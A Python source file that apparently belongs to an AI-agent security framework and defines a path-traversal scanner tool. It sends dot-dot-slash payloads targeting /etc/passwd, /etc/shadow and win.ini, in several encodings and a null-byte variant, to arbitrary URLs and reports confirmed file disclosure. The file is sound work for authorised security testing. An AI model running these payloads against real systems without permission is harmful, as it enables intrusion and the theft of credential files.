"""Path traversal vulnerability probe for web application assessment.

Tests URL path parameters for directory traversal (dot-dot-slash) attacks:
an attacker attempts to read files outside the web root by injecting
sequences like ../../../../etc/passwd into path-based parameters.

Probe strategy:
  1. Inject traversal sequences into each URL path segment and parameter.
  2. Check response for known Linux/Windows file content signatures.
  3. Vary encoding (plain, URL-encoded, double-encoded, null-byte suffix).

Severity:
  CRITICAL — target file content confirmed in response body
  HIGH     — non-200 baseline but traversal returns 200 (possible LFI)
  MEDIUM   — server error triggered by traversal (potential path leakage)
  LOW      — odd status change suggesting path-handling differences

Stdlib-only: http.client + ssl + urllib. No external dependencies.
"""

from __future__ import annotations

import http.client
import ssl
import urllib.parse
from typing import NamedTuple

from cai.sdk.agents import function_tool
from cai.tool_registry import TOOL_REGISTRY


# ---------------------------------------------------------------------------
# Traversal payloads and target signatures
# ---------------------------------------------------------------------------

_UNIX_TARGETS = [
    ("../../../../etc/passwd",             "root:"),
    ("../../../etc/passwd",                "root:"),
    ("../../etc/passwd",                   "root:"),
    ("../../../../etc/hosts",              "127.0.0.1"),
    ("../../../../proc/version",           "Linux"),
    ("../../../../etc/shadow",             "root:"),
]

_WIN_TARGETS = [
    ("..\\..\\..\\..\\Windows\\win.ini",   "[fonts]"),
    ("../../../../Windows/win.ini",        "[fonts]"),
    ("../../../../boot.ini",               "[boot loader]"),
]

_ALL_TARGETS = _UNIX_TARGETS + _WIN_TARGETS


def _encodings(path: str) -> list[tuple[str, str]]:
    """Return list of (description, encoded_path) variants for a traversal path."""
    url_enc = urllib.parse.quote(path, safe="")
    double_enc = urllib.parse.quote(url_enc, safe="")
    # Null byte suffix (truncates path in some C-string-based servers)
    null_suffix = path + "%00.jpg"
    return [
        ("plain",         path),
        ("url-encoded",   url_enc),
        ("double-enc",    double_enc),
        ("null-byte",     null_suffix),
    ]


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

class TraversalFinding(NamedTuple):
    url: str
    payload: str
    encoding: str
    severity: str   # CRITICAL | HIGH | MEDIUM | LOW | INFO
    status: str     # CONFIRMED | PROBABLE | STATUS_CHANGE | SAFE
    detail: str


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------

def _get(url: str, timeout: float = 6.0) -> tuple[int, str]:
    """GET url. Returns (status, body_lower). (-1, '') on failure."""
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urllib.parse.urlparse(url)
        is_https = parsed.scheme == "https"
        host = parsed.netloc or parsed.path
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        conn_cls = http.client.HTTPSConnection if is_https else http.client.HTTPConnection
        conn = conn_cls(host, timeout=timeout, **({"context": ctx} if is_https else {}))
        try:
            conn.request("GET", path, headers={
                "User-Agent": "Mozilla/5.0 (compatible; path-traversal-checker/1.0)",
                "Accept": "*/*",
            })
            resp = conn.getresponse()
            status = resp.status
            body = resp.read(8192).decode("utf-8", errors="replace").lower()
        finally:
            conn.close()
        return status, body
    except Exception:
        return -1, ""


# ---------------------------------------------------------------------------
# Probe helpers
# ---------------------------------------------------------------------------

def _build_probe_url(base_url: str, payload_path: str) -> list[str]:
    """Return probe URLs built by injecting payload into path segments and params."""
    parsed = urllib.parse.urlparse(base_url)
    probe_urls: list[str] = []

    # 1. Append to path
    stripped_path = parsed.path.rstrip("/")
    new_path = stripped_path + "/" + payload_path
    probe_urls.append(urllib.parse.urlunparse(parsed._replace(path=new_path)))

    # 2. Replace last path segment
    parts = parsed.path.rsplit("/", 1)
    if len(parts) == 2 and parts[1]:
        replaced_path = parts[0] + "/" + payload_path
        probe_urls.append(urllib.parse.urlunparse(parsed._replace(path=replaced_path)))

    # 3. Inject into each query parameter value
    if parsed.query:
        qs = urllib.parse.parse_qsl(parsed.query)
        for i, (key, _) in enumerate(qs):
            new_qs = list(qs)
            new_qs[i] = (key, payload_path)
            probe_urls.append(urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs))
            ))

    return probe_urls


def _probe_one(
    base_url: str,
    traversal_path: str,
    signature: str,
    baseline_status: int,
    timeout: float,
) -> list[TraversalFinding]:
    """Try all encodings and injection points for one traversal target. Returns findings."""
    findings: list[TraversalFinding] = []

    for enc_desc, encoded in _encodings(traversal_path):
        probe_urls = _build_probe_url(base_url, encoded)
        for purl in probe_urls:
            status, body = _get(purl, timeout)
            if status == -1:
                continue

            if signature.lower() in body:
                findings.append(TraversalFinding(
                    url=purl,
                    payload=traversal_path,
                    encoding=enc_desc,
                    severity="CRITICAL",
                    status="CONFIRMED",
                    detail=(
                        f"File content signature '{signature}' found in response body — "
                        f"path traversal confirmed via {enc_desc} encoding"
                    ),
                ))
                return findings  # One confirmed finding per target is enough

            if baseline_status != 200 and status == 200:
                findings.append(TraversalFinding(
                    url=purl,
                    payload=traversal_path,
                    encoding=enc_desc,
                    severity="HIGH",
                    status="PROBABLE",
                    detail=(
                        f"Baseline was HTTP {baseline_status} but traversal returned HTTP 200 "
                        f"({enc_desc} encoding) — possible LFI without content match"
                    ),
                ))

            if status in (500, 503) and baseline_status not in (500, 503):
                findings.append(TraversalFinding(
                    url=purl,
                    payload=traversal_path,
                    encoding=enc_desc,
                    severity="MEDIUM",
                    status="STATUS_CHANGE",
                    detail=(
                        f"Server error (HTTP {status}) triggered by traversal payload — "
                        "path is processed by server (potential error-based leakage)"
                    ),
                ))

    return findings


# ---------------------------------------------------------------------------
# Core check
# ---------------------------------------------------------------------------

def _check_path_traversal(url: str, timeout: float = 6.0) -> list[TraversalFinding]:
    """Probe url for path traversal vulnerabilities. Returns all findings."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    baseline_status, _ = _get(url, timeout)
    if baseline_status == -1:
        http_url = url.replace("https://", "http://", 1)
        baseline_status, _ = _get(http_url, timeout)
        if baseline_status != -1:
            url = http_url

    if baseline_status == -1:
        return [TraversalFinding(url, "", "none", "INFO", "SAFE", "Could not connect to target")]

    all_findings: list[TraversalFinding] = []
    for traversal_path, signature in _ALL_TARGETS:
        results = _probe_one(url, traversal_path, signature, baseline_status, timeout)
        all_findings.extend(results)
        # Stop early if we got a confirmed CRITICAL finding
        if any(f.severity == "CRITICAL" for f in results):
            break

    return all_findings


# ---------------------------------------------------------------------------
# Report formatter
# ---------------------------------------------------------------------------

def _run_path_traversal(targets: str, timeout: float = 6.0) -> str:
    items = [t.strip() for t in targets.replace(",", "\n").splitlines() if t.strip()]
    if not items:
        return "[path_traversal] Error: no URLs provided"

    lines: list[str] = [f"[path_traversal] Probing {len(items)} target(s)\n"]
    total_confirmed = total_probable = total_status_change = total_safe = 0

    for url in items:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        lines.append("─" * 60)
        lines.append(f"URL: {url}")
        lines.append("")

        findings = _check_path_traversal(url, timeout)

        confirmed = [f for f in findings if f.status == "CONFIRMED"]
        probable = [f for f in findings if f.status == "PROBABLE"]
        status_changes = [f for f in findings if f.status == "STATUS_CHANGE"]

        if not findings or all(f.status == "SAFE" for f in findings):
            lines.append("  SAFE — No traversal indicators found")
            total_safe += 1
        else:
            for f in (confirmed + probable + status_changes):
                icon = "!!!" if f.status == "CONFIRMED" else (" ! " if f.status == "PROBABLE" else " S ")
                lines.append(f"  [{icon}] {f.severity:<8}  {f.status}")
                lines.append(f"           Payload  : {f.payload}")
                lines.append(f"           Encoding : {f.encoding}")
                lines.append(f"           Detail   : {f.detail}")
                lines.append(f"           Probe URL: {f.url[:100]}")
                lines.append("")
            total_confirmed += len(confirmed)
            total_probable += len(probable)
            total_status_change += len(status_changes)

        lines.append("")

    lines.append("─" * 60)
    lines.append(
        f"Summary: {total_confirmed} CONFIRMED, {total_probable} PROBABLE, "
        f"{total_status_change} STATUS_CHANGE, {total_safe} SAFE"
    )

    if total_confirmed or total_probable:
        lines.append(
            "\nNote: Path traversal allows reading arbitrary files outside the web root. "
            "In combination with file upload, it can enable remote code execution. "
            "Validate and sanitise all file paths; use realpath() and a whitelist."
        )

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Function tool
# ---------------------------------------------------------------------------

@function_tool
def path_traversal(targets: str) -> str:
    """Probe web endpoints for path traversal (directory traversal / LFI) vulnerabilities.

    Injects dot-dot-slash sequences (../../etc/passwd, etc.) into URL path
    segments and query parameters, using plain, URL-encoded, double-encoded,
    and null-byte suffix variants. Checks response body for Unix and Windows
    file content signatures.

    Verdicts:
      CONFIRMED    — target file content found in response (e.g. root: from /etc/passwd)
      PROBABLE     — 200 response where baseline was non-200 (possible LFI)
      STATUS_CHANGE — server error triggered by payload (error-based leakage)

    Args:
        targets: Newline- or comma-separated list of target URLs.
                 Include query parameters to probe specific file parameters.
                 Examples:
                   "https://example.com/files?name=report.pdf"
                   "https://example.com/download/report.pdf"
                   "target.com/img?src=logo.png, https://other.org/view"

    Returns:
        Formatted report with CONFIRMED / PROBABLE / STATUS_CHANGE / SAFE
        status per target with the triggering payload and encoding.
    """
    return _run_path_traversal(targets)


TOOL_REGISTRY.register(
    "path_traversal",
    path_traversal,
    categories=["recon", "web", "exploitation"],
)
